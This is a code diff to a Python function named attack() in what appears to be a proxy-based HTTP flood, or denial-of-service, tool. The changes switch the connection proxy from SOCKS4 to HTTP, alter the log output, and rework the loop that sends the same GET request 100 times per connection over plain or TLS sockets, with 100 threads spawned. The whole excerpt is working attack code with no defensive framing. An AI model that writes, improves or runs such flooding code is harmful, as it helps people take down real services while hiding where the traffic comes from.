@@ -101,28 +101,28 @@ def attack():
         get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
         request = get_host + header
         s = socks.socksocket()
-        s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
+        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
         s.connect((ip, port))
         num_sent = num_sent + 1
-        print("[+] Sent ", num_sent, " => ", ip , ":", port)
+        print("[+]", num_sent, " Sent ", proxy, " => ", ip , ":", port)
         if port == 443:
             x = ssl.wrap_socket(s)
             try:
                 for i in range (100):
-                    x.send(str.encode(request))
+                    sent = x.send(str.encode(request))
+                    if not sent:
+                        s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                        break
             except:
                 x.close()
-
-        try:
-            for e in range(100):
-                s.send(str.encode(request))
-        except:
-            s.close()
-            try:
-                for e in range(100):
-                    s.send(str.encode(request))
-            except:
-                s.close()
+                try:
+                    for i in range(100):
+                        sent = x.send(str.encode(request))
+                        if not sent:
+                            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                            break
+                except:
+                    x.close()
 
 def build_thread():
 	for _ in range(100):
